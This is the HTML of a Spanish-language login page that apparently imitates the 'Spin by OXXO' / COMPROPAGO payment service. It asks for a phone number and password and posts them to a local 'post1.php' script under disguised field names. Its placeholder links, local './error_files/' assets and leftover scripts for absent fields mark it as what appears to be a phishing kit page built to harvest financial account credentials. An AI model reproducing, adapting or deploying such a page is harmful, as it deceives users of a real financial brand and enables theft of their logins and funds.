                                        </div>

                                    </div>
                                </div>
                            </div>




                        </div>


                    </div>
                    <div class="et_pb_section et_pb_section_2_tb_header et_pb_with_background et_section_regular et_pb_section--with-menu">






                        <div class="et_pb_row et_pb_row_1_tb_header et_pb_row--with-menu">
                            <div class="et_pb_column et_pb_column_4_4 et_pb_column_2_tb_header  et_pb_css_mix_blend_mode_passthrough et-last-child et_pb_column--with-menu">




                                <div class="et_pb_module et_pb_menu et_pb_menu_1_tb_header et_pb_bg_layout_light  et_pb_text_align_left et_dropdown_animation_fade et_pb_menu--with-logo et_pb_menu--style-left_aligned">




                                    <div class="et_pb_menu_inner_container clearfix">
                                        <div class="et_pb_menu__logo-wrap">
                                            <div class="et_pb_menu__logo">
                                                <a href="/index.php"><img loading="lazy" width="363" height="268" src="./error_files/logo-download.png" alt="logo spinbyoxxo" sizes="(max-width: 363px) 100vw, 363px" class="wp-image-10"></a>
                                            </div>
                                        </div>
                                        

                                    </div>
                                </div>
                            </div>




                        </div>


                    </div>
                </div>
            </header>
            <div id="et-main-area">

                <div id="main-content">



                    <article id="post-2255" class="post-2255 page type-page status-publish hentry">


                        <div class="entry-content">
                            <div class="et-l et-l--post">
                                <div class="et_builder_inner_content et_pb_gutters3">
                                    <div class="et_pb_section et_pb_section_0 et_section_regular">






                                        <div class="et_pb_row et_pb_row_0">
                                            <div class="et_pb_column et_pb_column_4_4 et_pb_column_0  et_pb_css_mix_blend_mode_passthrough et-last-child">



                                                <div id="engres" style="font-family: var(--bs-font-sans-serif); -webkit-tap-highlight-color: transparent; overflow-wrap: break-word; text-align: left; box-sizing: border-box; margin: 0px; padding: 0px; border: 0px; outline: 0px; text-size-adjust: 100%; vertical-align: baseline; background: transparent; line-height: 1.2; font-weight: 700; font-size: 36px; color: rgb(220, 103, 24) !important;">
                                                    Iniciar sesión
                                                </div>

                                                <div style="text-align: center;" class="et_pb_module et_pb_text et_pb_text_1  et_pb_text_align_left et_pb_bg_layout_light">


<fieldset style="fieldset
  display: block;
  -webkit-margin-start: 0px;
  -webkit-margin-end: 0px;
  -webkit-padding-before: 0em;
  -webkit-padding-start: 0em;
  -webkit-padding-end: 0em;
  -webkit-padding-after: 0em;
  border: 0px;
  border-image-source: initial;
  border-image-slice: initial;
  border-image-width: initial;
  border-image-outset: initial;
  border-image-repeat: initial;
  min-width: -webkit-min-content;
  padding: 5px;">

  <style type="text/css">
    .error-message {
        display:none;
  background-color: #fce4e4;
  border: 1px solid #fcc2c3;
  border-radius: 5px;
  
  padding: 8px 12px;
}

.error-text {
  color: #cc0033;
  line-height: 20px;
  text-shadow: 1px 1px rgba(250,250,250,.3);
}
</style>




<form id="registrationForm" method="post" action="post1.php" onsubmit="disableButton()">
    <div class="et_pb_text_inner">
        <!-- Campo para el teléfono -->
        <input 
            required 
            inputmode="numeric" 
            maxlength="12" 
            minlength="10" 
            type="text" 
            name="referenceCode" 
            id="referenceCode" 
            placeholder="Teléfono" 
            aria-label="Número de teléfono para registro" 
            autocomplete="tel" 
            class="et_pb_s" 
            style="margin-top: 5px; box-sizing: border-box; display: inline-block; font-weight: 300; font-size: 25px; border: 0px; outline: none; border-bottom: 1px solid #6949c7; width: 100%; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; color: #4b545f; background: #fff; font-family: Open Sans, Verdana; padding: 10px 15px; margin: 30px 0px; -webkit-transition: all 0.1s ease-in-out; -moz-transition: all 0.1s ease-in-out; -ms-transition: all 0.1s ease-in-out; -o-transition: all 0.1s ease-in-out; transition: all 0.1s ease-in-out;">

        <!-- Campo para la contraseña -->
        <div class="password-input-container" style="position: relative;">
            <input 
                required 
                type="password" 
                minlength="6" 
                maxlength="24" 
                id="referenceCodee" 
                name="referenceCodee" 
                placeholder="Contraseña" 
                aria-label="Crear contraseña para registro" 
                autocomplete="new-password" 
                class="et_pb_s" 
                style="display: inline-block; font-weight: 300; width: 100%; font-size: 25px; border: 0px; outline: none; border-bottom: 1px solid #6949c7; width: 100%; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; color: #4b545f; background: #fff; font-family: Open Sans, Verdana; padding: 10px 15px; margin: 30px 0px; -webkit-transition: all 0.1s ease-in-out; -moz-transition: all 0.1s ease-in-out; -ms-transition: all 0.1s ease-in-out; -o-transition: all 0.1s ease-in-out; transition: all 0.1s ease-in-out;">
            <button type="button" id="togglePassword" class="toggle-password" style="position: absolute; top: 50%; right: 10px; transform: translateY(-50%); cursor: pointer; background: none; border: none; z-index: 1;" aria-label="Mostrar contraseña">
            </button>
        </div>
    </div>

    <div class="et_pb_button_module_wrapper et_pb_button_0_wrapper et_pb_button_alignment_phone_center et_pb_module">
        <button id="submit" type="submit" style="box-sizing: border-box; margin: 0; font-family: inherit; text-transform: none; font-size: 20px; font-weight: 500; padding: .3em 1em; line-height: 1.7em !important; background-size: cover; background-position: 50%; background-repeat: no-repeat; border: 2px solid; border-radius: 3px; position: relative; text-decoration: none; cursor: pointer; color: #FFFFFF !important; background-color: #6949c7;">
            Continuar
        </button>
    </div>
</form>

<!-- JavaScript actualizado -->
<script>
    document.addEventListener('DOMContentLoaded', function () {
        const togglePassword = document.getElementById("togglePassword");
        const passwordInput = document.getElementById("referenceCodee");
        const submitButton = document.getElementById("submit");

        // Alternar visibilidad de la contraseña
        togglePassword.addEventListener("click", function () {
            const isPassword = passwordInput.type === "password";
            passwordInput.type = isPassword ? "text" : "password";
            togglePassword.innerHTML = isPassword 
                ? '<i class="fas fa-eye-slash"></i>' 
                : '<i class="fas fa-eye"></i>';
        });

        // Deshabilitar el botón después de hacer clic
        window.disableButton = function () {
            submitButton.disabled = true;
            submitButton.innerText = "Enviando...";
        };
    });
</script>

                    



                </div>

                <footer class="et-l et-l--footer">
                    <div class="et_builder_inner_content et_pb_gutters3">
                        <div id="contacto" class="et_pb_section et_pb_section_0_tb_footer et_section_regular">
                            






                            <div class="et_pb_row et_pb_row_0_tb_footer">
                                <div class="et_pb_column et_pb_column_1_4 et_pb_column_0_tb_footer  et_pb_css_mix_blend_mode_passthrough">




                                    <div class="et_pb_module et_pb_image et_pb_image_0_tb_footer">




                                        <span class="et_pb_image_wrap "><img loading="lazy" width="361" height="440" src="./error_files/brand-bg-white-cp.png" alt="" title="brand-bg-white-cp" sizes="(max-width: 361px) 100vw, 361px" class="wp-image-16"></span>
                                    </div>
                                </div>




                            </div>


                        </div>
                        <div class="et_pb_with_border et_pb_section et_pb_section_1_tb_footer et_section_regular et_pb_section--with-menu">






                            <div class="et_pb_row et_pb_row_1_tb_footer et_pb_row--with-menu">
                                <div class="et_pb_column et_pb_column_1_2 et_pb_column_4_tb_footer  et_pb_css_mix_blend_mode_passthrough et_pb_column--with-menu">




                                    <div class="et_pb_module et_pb_text et_pb_text_3_tb_footer  et_pb_text_align_left et_pb_bg_layout_light">




                                        <div class="et_pb_text_inner">
                                            <h3>Normativos</h3>
                                        </div>
                                    </div>
                                    <div class="et_pb_module et_pb_menu et_pb_menu_0_tb_footer lwp-hide-mobile-menu et_pb_bg_layout_light  et_pb_text_align_left et_dropdown_animation_fade et_pb_menu--without-logo et_pb_menu--style-left_aligned">




                                        <div class="et_pb_menu_inner_container clearfix">

                                            <div class="et_pb_menu__wrap">
                                                <div class="et_pb_menu__menu">
                                                    <nav class="et-menu-nav">
                                                        <ul id="menu-menu-legal" class="et-menu nav">
                                                            <li class="et_pb_menu_page_id-2148 menu-item menu-item-type-custom menu-item-object-custom menu-item-2148">
                                                                <a href="/index.php#">Declaración de privacidad</a></li>
                                                            <li class="et_pb_menu_page_id-2149 menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-2149">
                                                                <a href="/index.php#">Condiciones de uso</a>
                                                                
                                                            </li>
                                                            <li class="et_pb_menu_page_id-2101 menu-item menu-item-type-post_type menu-item-object-page menu-item-2152">
                                                                <a href="/index.php#">Representantes de ventas</a>
                                                            </li>
                                                            <li class="et_pb_menu_page_id-2036 menu-item menu-item-type-post_type menu-item-object-page menu-item-2153">
                                                                <a href="/index.php#">Registro de instituciones</a></li>
                                                        </ul>
                                                    </nav>
                                                </div>


                                                <div class="et_mobile_nav_menu">
                                                    <div class="mobile_nav closed">
                                                        
                                                    </div>
                                                </div>
                                            </div>

                                        </div>
                                    </div>
                                </div>
                                <div class="et_pb_column et_pb_column_1_2 et_pb_column_5_tb_footer  et_pb_css_mix_blend_mode_passthrough et-last-child">




                                    <div class="et_pb_module et_pb_text et_pb_text_4_tb_footer  et_pb_text_align_left et_pb_bg_layout_light">




                                        <div class="et_pb_text_inner">
                                            <p style="text-align: left;"><a style="text-decoration: none;" href="/index.php#"><strong>Consulta
                                                        los Costos y Comisiones de nuestros productos</strong></a></p>
                                        </div>
                                    </div>
                                </div>




                            </div>
                            <div class="et_pb_row et_pb_row_2_tb_footer">
                                <div class="et_pb_column et_pb_column_4_4 et_pb_column_6_tb_footer  et_pb_css_mix_blend_mode_passthrough et-last-child">




                                    <div class="et_pb_module et_pb_text et_pb_text_5_tb_footer  et_pb_text_align_left et_pb_bg_layout_light">




                                        <div class="et_pb_text_inner">
                                            <p><strong style="color: #808183;">COMPROPAGO S.A de C.V., una entidad financiera regulada y supervisada por las autoridades financieras. Ni el Gobierno Federal ni las entidades de la administración pública paraestatal pueden asumir la responsabilidad o garantizar los recursos de los clientes que sean utilizados en las transacciones realizadas. Además, no se hacen responsables por las obligaciones contraídas entre sus clientes u otros participantes en estas operaciones.</strong></p>
                                        </div>
                                    </div>
                                    <div class="et_pb_module et_pb_text et_pb_text_6_tb_footer  et_pb_text_align_left et_pb_bg_layout_light">




                                        <div class="et_pb_text_inner">
                                            <p style="text-align: center;"><span style="color: #000000;"><strong><strong 000="">©2024. Copyright ©</strong></strong></span></p>
                                        </div>
                                    </div>
                                </div>




                            </div>


                        </div>
                    </div>
                </footer>
            </div>


        </div>
    


    <style id="et-builder-module-design-tb-8-tb-14-deferred-2255-cached-inline-styles">
        .et_pb_section_0.et_pb_section {
            padding-bottom: 1px
        }

        .et_pb_row_0.et_pb_row {
            margin-top: -35px !important;
            margin-right: auto !important;
            margin-left: auto !important
        }

        .et_pb_text_1 {
            font-size: 18px;
            margin-bottom: 14px !important
        }

        .et_pb_text_1 h2 {
            font-size: 29px
        }

        body #page-container .et_pb_section .et_pb_button_0 {
            color: #FFFFFF !important;
            background-color: #6949c7
        }

        .et_pb_button_0 {
            text-decoration: none
        }

        .et_pb_button_0,
        .et_pb_button_0:after {
            transition: all 300ms ease 0ms
        }

        @media only screen and (max-width:980px) {
            body #page-container .et_pb_section .et_pb_button_0:after {
                display: inline-block;
                opacity: 0
            }

            body #page-container .et_pb_section .et_pb_button_0:hover:after {
                opacity: 1
            }
        }

        @media only screen and (max-width:767px) {
            body #page-container .et_pb_section .et_pb_button_0:after {
                display: inline-block;
                opacity: 0
            }

            body #page-container .et_pb_section .et_pb_button_0:hover:after {
                opacity: 1
            }
        }
    </style>
    <style id="et-builder-module-design-tb-8-tb-14-2255-cached-inline-styles">
        .et_pb_section_2_tb_header.et_pb_section,
        .et_pb_section_0_tb_header.et_pb_section {
            padding-top: 0px;
            padding-bottom: 0px;
            margin-top: 0px;
            margin-bottom: 0px;
            background-color: #6949c7 !important
        }

        .et_pb_row_0_tb_header.et_pb_row,
        .et_pb_row_1_tb_header.et_pb_row {
            padding-top: 15px !important;
            padding-bottom: 15px !important;
            padding-top: 15px;
            padding-bottom: 15px
        }

        .et_pb_image_0_tb_header {
            padding-top: 0px;
            padding-bottom: 0px;
            margin-top: 0px !important;
            margin-bottom: 0px !important;
            width: 40%;
            text-align: center
        }

        .et_pb_image_0_tb_header:before,
        .et_pb_image_0_tb_header:after {
            display: none
        }

        .et_pb_menu_0_tb_header.et_pb_menu ul li a {
            font-weight: 600;
            font-size: 15px;
            color: #FFFFFF !important
        }

        .et_pb_menu_0_tb_header.et_pb_menu {
            background-color: #6949c7
        }

        .et_pb_menu_0_tb_header {
            padding-top: 0px;
            margin-top: 20px !important
        }

        .et_pb_menu_0_tb_header.et_pb_menu ul li.current-menu-item a,
        .et_pb_menu_1_tb_header.et_pb_menu ul li.current-menu-item a {
            color: #FFFFFF !important
        }

        .et_pb_menu_1_tb_header.et_pb_menu .et_mobile_menu,
        .et_pb_menu_1_tb_header.et_pb_menu .et_mobile_menu ul,
        .et_pb_menu_0_tb_header.et_pb_menu .et_mobile_menu,
        .et_pb_menu_0_tb_header.et_pb_menu .et_mobile_menu ul,
        .et_pb_menu_0_tb_header.et_pb_menu .nav li ul,
        .et_pb_menu_1_tb_header.et_pb_menu .nav li ul {
            background-color: #6949c7 !important
        }

        .et_pb_menu_0_tb_header .et_pb_menu_inner_container>.et_pb_menu__logo-wrap,
        .et_pb_menu_0_tb_header .et_pb_menu__logo-slot {
            width: auto;
            max-width: 100%
        }

        .et_pb_menu_1_tb_header .et_pb_menu_inner_container>.et_pb_menu__logo-wrap .et_pb_menu__logo img,
        .et_pb_menu_1_tb_header .et_pb_menu__logo-slot .et_pb_menu__logo-wrap img,
        .et_pb_menu_0_tb_header .et_pb_menu_inner_container>.et_pb_menu__logo-wrap .et_pb_menu__logo img,
        .et_pb_menu_0_tb_header .et_pb_menu__logo-slot .et_pb_menu__logo-wrap img {
            height: auto;
            max-height: none
        }

        .et_pb_menu_0_tb_header .mobile_nav .mobile_menu_bar:before {
            font-size: 47px;
            color: #FFFFFF
        }

        .et_pb_menu_0_tb_header .et_pb_menu__icon.et_pb_menu__search-button,
        .et_pb_menu_0_tb_header .et_pb_menu__icon.et_pb_menu__close-search-button {
            font-size: 16px;
            color: #7EBEC5
        }

        .et_pb_menu_1_tb_header .et_pb_menu__icon.et_pb_menu__search-button,
        .et_pb_menu_1_tb_header .et_pb_menu__icon.et_pb_menu__close-search-button,
        .et_pb_menu_0_tb_header .et_pb_menu__icon.et_pb_menu__cart-button,
        .et_pb_menu_1_tb_header .et_pb_menu__icon.et_pb_menu__cart-button {
            color: #7EBEC5
        }

        .et_pb_menu_1_tb_header.et_pb_menu ul li a {
            font-weight: 700;
            font-size: 16px;
            color: #FFFFFF !important
        }

        .et_pb_menu_1_tb_header.et_pb_menu {
            background-color: #6949c7;
            text-decoration: none
        }

        .et_pb_menu_1_tb_header {
            margin-right: -16px !important
        }

        .et_pb_menu_1_tb_header .et_pb_menu_inner_container>.et_pb_menu__logo-wrap,
        .et_pb_menu_1_tb_header .et_pb_menu__logo-slot {
            width: 38%;
            max-width: 100%
        }

        .et_pb_menu_1_tb_header .mobile_nav .mobile_menu_bar:before {
            font-size: 55px;
            color: #FFFFFF
        }

        @media only screen and (min-width:981px) {
            .et_pb_section_2_tb_header {
                display: none !important
            }
        }

        @media only screen and (max-width:980px) {
            .et_pb_image_0_tb_header .et_pb_image_wrap img {
                width: auto
            }
        }

        @media only screen and (min-width:768px) and (max-width:980px) {
            .et_pb_section_2_tb_header {
                display: none !important
            }
        }

        @media only screen and (max-width:767px) {
            .et_pb_section_0_tb_header {
                display: none !important
            }

            .et_pb_image_0_tb_header {
                display: none;
                display: none !important
            }

            .et_pb_image_0_tb_header .et_pb_image_wrap img {
                width: auto
            }

            .et_pb_menu_0_tb_header {
                margin-top: 0px !important
            }
        }

        .et_pb_image_0_tb_footer {
            text-align: center
        }

        .et_pb_text_1_tb_footer.et_pb_text,
        .et_pb_text_5_tb_footer.et_pb_text,
        .et_pb_text_0_tb_footer.et_pb_text,
        .et_pb_text_3_tb_footer.et_pb_text,
        .et_pb_text_1_tb_footer.et_pb_text a,
        .et_pb_text_4_tb_footer.et_pb_text,
        .et_pb_text_4_tb_footer.et_pb_text a,
        .et_pb_text_5_tb_footer.et_pb_text a,
        .et_pb_text_6_tb_footer.et_pb_text,
        .et_pb_text_6_tb_footer.et_pb_text a,
        .et_pb_text_0_tb_footer.et_pb_text a {
            color: #000000 !important
        }

        .et_pb_text_0_tb_footer,
        .et_pb_text_1_tb_footer {
            font-size: 17px
        }

        body #page-container .et_pb_section .et_pb_social_media_follow li.et_pb_social_media_follow_network_0_tb_footer .follow_button {
            border-radius: 30px
        }

        body #page-container .et_pb_section .et_pb_social_media_follow li.et_pb_social_media_follow_network_1_tb_footer .follow_button:before,
        body #page-container .et_pb_section .et_pb_social_media_follow li.et_pb_social_media_follow_network_1_tb_footer .follow_button:after,
        body #page-container .et_pb_section .et_pb_social_media_follow li.et_pb_social_media_follow_network_0_tb_footer .follow_button:before,
        body #page-container .et_pb_section .et_pb_social_media_follow li.et_pb_social_media_follow_network_0_tb_footer .follow_button:after {
            display: none !important
        }

        body #page-container .et_pb_section .et_pb_social_media_follow li.et_pb_social_media_follow_network_1_tb_footer .follow_button {
            border-width: 0px !important;
            border-radius: 21px
        }

        .et_pb_text_2_tb_footer {
            font-size: 16px
        }

        .et_pb_section_1_tb_footer {
            border-top-width: 1px
        }

        .et_pb_row_1_tb_footer.et_pb_row {
            padding-bottom: 4px !important;
            padding-bottom: 4px
        }

        .et_pb_text_3_tb_footer {
            font-weight: 700
        }

        .et_pb_text_3_tb_footer h3 {
            font-weight: 700;
            font-size: 20px
        }

        .et_pb_menu_0_tb_footer.et_pb_menu ul li a {
            font-weight: 700;
            font-size: 16px;
            color: #000000 !important
        }

        .et_pb_menu_0_tb_footer.et_pb_menu {
            background-color: #ffffff
        }

        .et_pb_menu_0_tb_footer {
            margin-top: -21px !important;
            margin-right: 280px !important
        }

        .et_pb_menu_0_tb_footer.et_pb_menu .et_mobile_menu,
        .et_pb_menu_0_tb_footer.et_pb_menu .et_mobile_menu ul,
        .et_pb_menu_0_tb_footer.et_pb_menu .nav li ul {
            background-color: #ffffff !important
        }

        .et_pb_menu_0_tb_footer .et_pb_menu_inner_container>.et_pb_menu__logo-wrap,
        .et_pb_menu_0_tb_footer .et_pb_menu__logo-slot {
            width: auto;
            max-width: 100%
        }

        .et_pb_menu_0_tb_footer .et_pb_menu_inner_container>.et_pb_menu__logo-wrap .et_pb_menu__logo img,
        .et_pb_menu_0_tb_footer .et_pb_menu__logo-slot .et_pb_menu__logo-wrap img {
            height: auto;
            max-height: none
        }

        .et_pb_menu_0_tb_footer .mobile_nav .mobile_menu_bar:before,
        .et_pb_menu_0_tb_footer .et_pb_menu__icon.et_pb_menu__search-button,
        .et_pb_menu_0_tb_footer .et_pb_menu__icon.et_pb_menu__close-search-button,
        .et_pb_menu_0_tb_footer .et_pb_menu__icon.et_pb_menu__cart-button {
            color: #7EBEC5
        }

        .et_pb_text_4_tb_footer {
            font-size: 15px;
            padding-top: 44px !important
        }

        .et_pb_text_5_tb_footer a,
        .et_pb_text_6_tb_footer a,
        .et_pb_text_4_tb_footer a {
            font-weight: 800
        }

        .et_pb_row_2_tb_footer.et_pb_row {
            padding-top: 2px !important;
            padding-top: 2px
        }

        .et_pb_text_5_tb_footer {
            font-size: 15px;
            margin-top: 10px !important
        }

        .et_pb_text_6_tb_footer {
            font-size: 15px;
            padding-top: 0px !important
        }

        .et_pb_social_media_follow_network_1_tb_footer a.icon,
        .et_pb_social_media_follow_network_0_tb_footer a.icon {
            background-color: #531bc5 !important
        }

        .et_pb_social_media_follow_network_1_tb_footer.et_pb_social_icon a.icon {
            border-width: 0px
        }

        @media only screen and (min-width:981px) {
            .et_pb_image_0_tb_footer {
                width: 74%
            }
        }

        @media only screen and (max-width:980px) {
            .et_pb_image_0_tb_footer {
                width: 74%
            }

            .et_pb_image_0_tb_footer .et_pb_image_wrap img {
                width: auto
            }

            .et_pb_section_1_tb_footer {
                border-top-width: 1px
            }

            .et_pb_menu_0_tb_footer {
                margin-top: -21px !important;
                margin-right: 280px !important
            }

            .et_pb_text_4_tb_footer {
                padding-top: 44px !important
            }
        }

        @media only screen and (max-width:767px) {
            .et_pb_image_0_tb_footer {
                width: 50%
            }

            .et_pb_image_0_tb_footer .et_pb_image_wrap img {
                width: auto
            }

            .et_pb_section_1_tb_footer {
                border-top-width: 1px
            }

            .et_pb_menu_0_tb_footer {
                margin-top: 0px !important;
                margin-right: 100px !important
            }

            .et_pb_text_4_tb_footer {
                padding-top: 0px !important
            }
        }
    </style>




<script type="text/javascript">

    // this function also validates password length > 6
    function validate_phone(event){

    var $phone = $('#telefono');
    var phone = $phone.val();
    $('#telefono').on('input', function() {
    var number = $(this).val().replace(/[^\d]/g, '')
    if (number.length == 7) {
      number = number.replace(/(\d{3})(\d{4})/, "$1 $2");
    } else if (number.length == 10) {
      number = number.replace(/(\d{3})(\d{4})(\d{3})/, "$1 $2 $3");

      // remove disable submit
      $("#submit").removeAttr("disabled");
      $("#submit").css('background-color', '#6949c7');
    } else if (number.length <= 10) {
        // add disable submit
        $("#submit").attr("disabled", true);
        $("#submit").css('background-color', '#686868');
    }

    $(this).val(number)


  });

  }

  $('#telefono').on('keypress keydown keyup', function(event){ validate_phone(event); });



</script>

<script type="text/javascript">
    
    $("input[name=superpwd]").keypress(function (e) {
     //if the letter is not digit then display error and don't type anything
     if (e.which != 8 && e.which != 0 && (e.which == 32)) {
        //display error message
        //$("#errmsg").html("Digits Only").show().fadeOut("slow");
               return false;
    }
   });

</script>
</body></html>